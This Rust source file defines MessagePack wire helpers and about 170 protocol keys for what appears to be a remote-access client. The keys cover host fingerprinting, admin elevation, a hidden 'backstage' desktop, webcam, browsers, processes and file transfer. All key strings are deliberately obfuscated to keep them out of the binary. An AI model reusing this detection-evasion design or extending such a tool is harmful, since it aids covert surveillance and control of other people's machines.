//! MessagePack wire helpers.
//!
//! Every map key is produced by `obfstr!` so the binary does not carry a
//! plaintext copy of the protocol vocabulary. Maps are built explicitly
//! instead of relying on serde field names.

use anyhow::{Context, Result, anyhow};
pub use rmpv::Value;

include!(concat!(env!("OUT_DIR"), "/wire_contract.rs"));

macro_rules! wire_keys {
    ($($name:ident => $literal:literal),* $(,)?) => {
        $(
            #[inline]
            pub fn $name() -> String { crate::obfstr!($literal) }
        )*
    };
}

wire_keys! {
    key_type => "type",
    key_id => "id",
    key_hwid => "hwid",
    key_host => "host",
    key_os => "os",
    key_arch => "arch",
    key_host_arch => "hostArch",
    key_version => "version",
    key_user => "user",
    key_monitors => "monitors",
    key_monitor_info => "monitorInfo",
    key_build_tag => "buildTag",
    key_public_key => "publicKey",
    key_signature => "signature",
    key_cpu => "cpu",
    key_gpu => "gpu",
    key_ram => "ram",
    key_is_admin => "isAdmin",
    key_elevation => "elevation",
    key_protocol_version => "protocolVersion",
    key_command_versions => "commandVersions",
    key_command_id => "commandId",
    key_command_type => "commandType",
    key_command_version => "commandVersion",
    key_ok => "ok",
    key_message => "message",
    key_error_code => "errorCode",
    key_supported_versions => "supportedVersions",
    key_min => "min",
    key_max => "max",
    key_ts => "ts",
    key_nonce => "nonce",
    key_status => "status",
    key_payload => "payload",
    key_session_id => "sessionId",
    key_data => "data",
    key_exit_code => "exitCode",
    key_error => "error",
    key_width => "width",
    key_height => "height",
    key_header => "header",
    key_monitor => "monitor",
    key_fps => "fps",
    key_format => "format",
    key_backstage => "backstage",
    key_webcam => "webcam",
    key_x => "x",
    key_y => "y",
    key_visible => "visible",
    key_image => "image",
    key_bytes => "bytes",
    key_capture_ms => "captureMs",
    key_encode_ms => "encodeMs",
    key_send_ms => "sendMs",
    key_total_ms => "totalMs",
    key_transport => "transport",
    key_path => "path",
    key_entries => "entries",
    key_name => "name",
    key_is_dir => "isDir",
    key_size => "size",
    key_mod_time => "modTime",
    key_mode => "mode",
    key_owner => "owner",
    key_group => "group",
    key_attrs => "attrs",
    key_free_bytes => "freeBytes",
    key_total_bytes => "totalBytes",
    key_fs_type => "fsType",
    key_access_denied => "accessDenied",
    key_can_request_access => "canRequestAccess",
    key_access_help => "accessHelp",
    key_offset => "offset",
    key_total => "total",
    key_chunk_index => "chunkIndex",
    key_chunks_total => "chunksTotal",
    key_transfer_id => "transferId",
    key_received => "received",
    key_content => "content",
    key_is_binary => "isBinary",
    key_search_id => "searchId",
    key_results => "results",
    key_line => "line",
    key_match => "match",
    key_complete => "complete",
    key_icons => "icons",
    key_icon => "icon",
    key_key => "key",
    key_png => "png",
    key_thumbs => "thumbs",
    key_jpeg => "jpeg",
    key_w => "w",
    key_h => "h",
    key_is_text => "isText",
    key_algorithm => "algorithm",
    key_digest => "digest",
    key_files => "files",
    key_dirs => "dirs",
    key_done => "done",
    key_output => "output",
    key_plugin_id => "pluginId",
    key_event => "event",
    key_category => "category",
    key_title => "title",
    key_process => "process",
    key_process_name => "processName",
    key_primary => "primary",
    key_process_path => "processPath",
    key_pid => "pid",
    key_keyword => "keyword",
    key_filename => "filename",
    key_chunk => "chunk",
    key_is_last => "isLast",
    key_is_encoded => "isEncoded",
    key_granted => "granted",
    key_reason => "reason",
    key_probed => "probed",
    key_display => "display",
    key_profiles => "profiles",
    key_codecs => "codecs",
    key_max_height => "maxHeight",
    key_label => "label",
    key_providers => "providers",
    key_codec => "codec",
    key_encoders => "encoders",
    key_transports => "transports",
    key_hardware => "hardware",
    key_detail => "detail",
    key_seq => "seq",
    key_at => "at",
    key_source => "source",
    key_blob => "blob",
    key_dropped => "dropped",
    key_from_seq => "fromSeq",
    key_to_seq => "toSeq",
    key_enabled => "enabled",
    key_processes => "processes",
    key_ppid => "ppid",
    key_exe_path => "exePath",
    key_memory => "memory",
    key_username => "username",
    key_self_process => "self",
    key_devices => "devices",
    key_index => "index",
    key_max_fps => "maxFps",
    key_selected => "selected",
    key_browser => "browser",
    key_percent => "percent",
    key_copied_bytes => "copiedBytes",
    key_success => "success",
    key_gpu_pid => "gpuPid",
    key_exe => "exe",
    key_browsers => "browsers",
    key_apps => "apps",
    key_step => "step",
    key_windows => "windows",
    key_text => "text",
    key_connection_id => "connectionId",
    key_candidate => "candidate",
    key_sdp_mid => "sdpMid",
    key_sdp_mline_index => "sdpMLineIndex",
    key_sdp => "sdp",
    key_kind => "kind",
    key_answer => "answer",
    key_ice_servers => "iceServers",
    key_urls => "urls",
    key_credential => "credential",
}

/// Insertion-ordered MessagePack map builder.
#[derive(Debug, Default, Clone)]
pub struct Obj {
    entries: Vec<(Value, Value)>,
}

impl Obj {
    pub fn new() -> Self {
        Self { entries: Vec::new() }
    }

    pub fn put(mut self, key: String, value: Value) -> Self {
        self.entries.push((Value::String(key.into()), value));
        self
    }

    pub fn put_opt(self, key: String, value: Option<Value>) -> Self {
        match value {
            Some(value) => self.put(key, value),
            None => self,
        }
    }

    pub fn value(self) -> Value {
        Value::Map(self.entries)
    }
}

pub fn s(value: &str) -> Value {
    Value::String(value.into())
}

pub fn owned(value: String) -> Value {
    Value::String(value.into())
}

pub fn n(value: i64) -> Value {
    Value::Integer(value.into())
}

pub fn u(value: u64) -> Value {
    Value::Integer(value.into())
}

pub fn float(value: f64) -> Value {
    Value::F64(value)
}

pub fn b(value: bool) -> Value {
    Value::Boolean(value)
}

pub fn bin(value: Vec<u8>) -> Value {
    Value::Binary(value)
}

pub fn arr(value: Vec<Value>) -> Value {
    Value::Array(value)
}

pub fn nil() -> Value {
    Value::Nil
}

pub fn encode(value: &Value) -> Result<Vec<u8>> {
    rmp_serde::to_vec(value).context("encode MessagePack")
}

pub fn decode(bytes: &[u8]) -> Result<Value> {
    rmp_serde::from_slice(bytes).context("decode MessagePack")
}

pub fn field<'a>(value: &'a Value, name: &str) -> Option<&'a Value> {
    value
        .as_map()?
        .iter()
        .find_map(|(key, value)| (key.as_str() == Some(name)).then_some(value))
}

pub fn string_field<'a>(value: &'a Value, name: &str) -> Option<&'a str> {
    field(value, name)?.as_str()
}

pub fn required_string<'a>(value: &'a Value, name: &str) -> Result<&'a str> {
    string_field(value, name).ok_or_else(|| anyhow!("missing field"))
}

pub fn integer_field(value: &Value, name: &str) -> Option<i64> {
    let value = field(value, name)?;
    value
        .as_i64()
        .or_else(|| value.as_u64().and_then(|number| i64::try_from(number).ok()))
}

pub fn bool_field(value: &Value, name: &str) -> Option<bool> {
    field(value, name)?.as_bool()
}

pub fn float_field(value: &Value, name: &str) -> Option<f64> {
    field(value, name)?.as_f64()
}

pub fn bytes_field<'a>(value: &'a Value, name: &str) -> Option<&'a [u8]> {
    match field(value, name)? {
        Value::Binary(data) => Some(data),
        Value::String(text) => Some(text.as_bytes()),
        _ => None,
    }
}

pub fn map_field<'a>(value: &'a Value, name: &str) -> Option<&'a Value> {
    field(value, name)
}

pub fn array_field<'a>(value: &'a Value, name: &str) -> &'a [Value] {
    match field(value, name) {
        Some(Value::Array(items)) => items,
        _ => &[],
    }
}

pub fn command_versions() -> Value {
    let mut entries = Vec::new();
    for (command, min, max) in command_version_support() {
        entries.push((
            Value::String(command.into()),
            Obj::new()
                .put(key_min(), n(i64::from(min)))
                .put(key_max(), n(i64::from(max)))
                .value(),
        ));
    }
    Value::Map(entries)
}

pub fn command_version_range(command: &str) -> Option<(u16, u16)> {
    command_version_support()
        .into_iter()
        .find(|(name, _, _)| name == command)
        .map(|(_, min, max)| (min, max))
}

pub fn now_millis() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as i64
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn messagepack_uses_wire_field_names() {
        let ping = Obj::new()
            .put(key_type(), s("ping"))
            .put(key_ts(), n(123))
            .value();
        let decoded = decode(&encode(&ping).unwrap()).unwrap();
        assert_eq!(string_field(&decoded, "type"), Some("ping"));
        assert_eq!(integer_field(&decoded, "ts"), Some(123));
    }

    #[test]
    fn advertises_every_contract_command() {
        let contract: serde_json::Value = serde_json::from_slice(
            &std::fs::read("../protocol/wire-contract.json").expect("read contract"),
        )
        .expect("parse contract");
        let expected = contract["commands"].as_array().unwrap().len();
        assert_eq!(command_version_support().len(), expected);
    }
}
